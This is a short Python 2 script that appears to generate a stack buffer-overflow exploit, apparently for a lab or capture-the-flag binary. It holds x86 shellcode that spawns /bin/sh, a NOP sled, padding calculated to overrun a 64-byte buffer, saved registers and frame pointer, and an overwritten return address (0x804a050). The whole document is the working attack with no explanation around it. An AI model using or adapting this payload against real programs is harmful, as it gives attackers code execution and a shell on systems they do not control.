import struct

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

buffer_size = 64
val_size = 4
edi_ebx_size = 8
ebp_size = 4
total = buffer_size + val_size + edi_ebx_size + ebp_size

print "dat_wil" + "\x90" * 20 + shellcode
print "\x90" * total + struct.pack('I', 0x804a050)
